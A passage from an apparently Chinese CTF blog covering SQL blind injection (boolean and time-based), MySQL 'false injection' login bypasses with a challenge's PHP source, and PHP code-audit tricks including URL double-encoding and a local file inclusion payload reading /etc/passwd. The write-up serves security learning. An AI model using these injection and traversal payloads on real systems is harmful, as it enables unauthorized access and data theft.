variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是疯狂在那里猜数据库，根据他的反应来判断正确与否</p><h3 id="注入举例"><a href="#注入举例" class="headerlink" title="注入举例"></a>注入举例</h3><h4 id="猜用户名"><a href="#猜用户名" class="headerlink" title="猜用户名"></a>猜用户名</h4><p>随便输几个数或字母，发现<br>1,2,3,4,5是有的用户名</p><h4 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h4><h5 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h5><pre><code>输入1’ and length(database())=1 #  ，显示不存在；输入1’ and length(database())=2 #  ，显示不存在；输入1’ and length(database())=3 #  ，显示不存在；输入1’ and length(database())=4 #  ，显示存在：</code></pre><h5 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h5><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</code></pre><h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><pre><code>猜解表名：1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在…1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在说明第一个表的名字的第一个字符为小写字母g</code></pre><h4 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h4><p>首先猜解表中字段的数量：</p><pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><h4 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h4><p>同样采用二分法。</p><h3 id="使用基于时间的盲注"><a href="#使用基于时间的盲注" class="headerlink" title="使用基于时间的盲注"></a>使用基于时间的盲注</h3><p>但是比赛时可能会由于服务器的迟缓，导致结果不正确。</p><h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟</code></pre><p>说明存在字符型的基于时间的盲注。</p><h4 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h4><p>首先猜解数据名的长度：</p><pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟1’ and if(length(database())=2,sleep(5),1) # 没有延迟1’ and if(length(database())=3,sleep(5),1) # 没有延迟1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</code></pre><p>说明数据库名的第一个字符为小写字母d。</p><p>…</p><p>重复上述步骤，即可猜解出数据库名。</p><h2 id="false注入"><a href="#false注入" class="headerlink" title="false注入"></a>false注入</h2><h3 id="原理-MYSQL的隐式类型转换"><a href="#原理-MYSQL的隐式类型转换" class="headerlink" title="原理 MYSQL的隐式类型转换"></a>原理 MYSQL的隐式类型转换</h3><pre><code>The following rules describe how conversion occurs for comparison operations:If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.If both arguments in a comparison operation are strings, they are compared as strings.If both arguments are integers, they are compared as integers.Hexadecimal values are treated as binary strings if not compared to a number.If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.In all other cases, the arguments are compared as floating-point (real) numbers.如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换两个参数都是字符串，按照字符串比较。不做类型转换两个参数都是整数，按照整数比较。不做类型转换如果不与数字进行比较，则将十六进制值视为二进制字符串。有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较所有其他情况下，两个参数都会被转换为浮点数再进行比较最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</code></pre><p>为什么username=0会导致返回数据了，就是因为这里会将数据转换为浮点数比较，但是字符串转换会出问题，从而返回0使得0=0从而为true得到结果，而后面passwd查询少一组数据的原因就是admin的passwd字段第一个字符是2 从而返回2 并非为0。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p>加：+<br><code>&#39;+&#39;, 拼接的语句：where username=&#39;&#39;+&#39;&#39;</code><br>减：-<br><code>&#39;-&#39; 拼接的语句：where username=&#39;&#39;-&#39;&#39;</code><br>乘：*<br><code>&#39;*&#39; 拼接的语句：where username=&#39;&#39;*&#39;&#39;</code><br>除：/<br><code>&#39;/6# 拼接的语句：where username=&#39;&#39;/6#</code><br>取余：%<br><code>&#39;%1# 拼接的语句：where username=&#39;&#39;%1#</code></p><h4 id="位操作运算"><a href="#位操作运算" class="headerlink" title="位操作运算"></a>位操作运算</h4><p>我们可以使用当字符串和数字运算的时候类型转换的问题进行利用</p><p>我们可以用的位运算符有：<br>和运算：&amp;<br><code>&#39;&amp;0# 拼接的语句：where username=&#39;&#39;&amp;0#&#39;</code><br>或运算：|<br><code>&#39;|0# 拼接的语句：where username=&#39;&#39;|0#&#39;</code><br>异或运算：^<br><code>&#39;^0# 拼接的语句：where username=&#39;&#39;^0#&#39;</code><br>移位操作：<br><code>&#39;&lt;&lt;0# &#39;&gt;&gt;0#</code><br>位非（~）：这里位非运算符由于是在表达式之前的</p><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>安全等于：&lt;=&gt;<br><code>&#39;=0&lt;=&gt;1# 拼接的语句：where username=&#39;&#39;=0&lt;=&gt;1#&#39;</code><br>不等于&lt;&gt;(!=)<br><code>&#39;=0&lt;&gt;0# 拼接的语句：where username=&#39;&#39;=0&lt;&gt;0#&#39;</code><br>大小于&gt;或&lt;<br><code>&#39;&gt;-1# 拼接的语句：where username=&#39;&#39;&gt;-1#</code></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null# &#39;in(-1,1)# &#39;not in(1,0)# &#39;like 1# &#39;REGEXP 1# &#39;BETWEEN 1 AND 1# &#39;div 1# &#39;xor 1# &#39;=round(0,1)=&#39;1 &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p><h4 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h4><p>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p><p>这里举例一道题</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">function</span> <span class="token function">randStr</span><span class="token punctuation">(</span><span class="token variable">$lenth</span><span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token variable">$strBase</span> <span class="token operator">=</span> <span class="token string">"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"</span><span class="token punctuation">;</span>          <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$lenth</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strBase</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strBase</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$lenth</span> <span class="token operator">--</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>         <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$install</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token variable">$sql</span> <span class="token operator">=</span> "create table `user` <span class="token punctuation">(</span>          `         id` <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> unsigned <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span>  <span class="token constant">AUTO_INCREMENT</span> <span class="token punctuation">,</span>         `username` <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>                   `passwd` <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>                   `role` <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span>        <span class="token punctuation">)</span>         <span class="token constant">ENGINE</span><span class="token operator">=</span>MyISAM <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>latin1 <span class="token constant">COLLATE</span><span class="token operator">=</span>latin1_general_ci "<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token variable">$sql</span>  <span class="token operator">=</span> <span class="token string">"insert into `user`(`username`,`passwd`,`role`) values ('admin','"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">randStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"','admin')"</span><span class="token punctuation">;</span>        <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span> <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">"/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"%0a"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"%0b"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%0c'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%0d'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%a0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/i"</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"you can't input this illegal char!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">global</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>       <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select role from `user` where username ='"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>       <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"$username is "</span><span class="token punctuation">.</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Don't have this user!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">global</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>         <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>          <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"you can't login this as admin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>          <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where username='"</span><span class="token punctuation">.</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">escape_string</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' and passwd='"</span><span class="token punctuation">.</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>         <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"sorry,username or passwd error!"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>  <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">;</span>  <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">"source"</span><span class="token punctuation">:</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span> <span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">"login"</span> <span class="token punctuation">:</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">"show"</span> <span class="token punctuation">:</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们注意到filter()函数</p><pre><code>$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;</code></pre><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，<br><code>username = &quot;admin&#39;^!(mid((passwd)from(-{pos}))=&#39;{passwd}&#39;)=&#39;1&quot;</code><br>这里官方给出的就是利用异或，其实这里并不需要’admin‘只要是一串字符串就可以</p><p>异或会使字符串都转为浮点型，都变为了0，由于0=0^0 -&gt; 1^0 -&gt; 1当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’/4#这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php 代码审计</title>
      <link href="/2020/CTF/php/"/>
      <url>/2020/CTF/php/</url>
      
        <content type="html"><![CDATA[<p>web题一个常见的方向，php的代码审计</p><a id="more"></a><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token operator">===</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;p>not allowed!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;p>Access granted!&lt;/p>"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;p>Key: xxxxxxx &lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span>Can you anthenticate to this website<span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p><img src="/images/urlencode.png" alt="urlencode" loading="lazy"></p><p>%的url编码为%25，因此构造payload=<code>id=%2561dmin</code><br>因此在php中检测到<code>$_GET[id] = &quot;%61dmin&quot;;</code></p><h1 id="题目2-php文件包含"><a href="#题目2-php文件包含" class="headerlink" title="题目2 php文件包含"></a>题目2 php文件包含</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>常见的导致文件包含的函数有：</p><ol><li>PHP：<code>include()，include_once()，require()，require_once()，fopen()，readfile()</code> 等</li><li>JSP Servlet：<code>ava.io.File()，java.io.FileReader()</code> 等</li><li>ASP：<code>includefile，includevirtual</code> 等<br>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</li></ol><h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>本地文件包含，Local File Inclusion，LFI。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'/home/wwwrun/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">include</span> <span class="token string">'/home/wwwrun/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><code>%00 截断</code><br>上述代码存在本地文件包含，可用<code>%00</code>截断的方式读取 <code>/etc/passwd</code> 文件内容。<br><code>?file=../../../../../../../../../etc/passwd%00</code><br>适用条件：需要 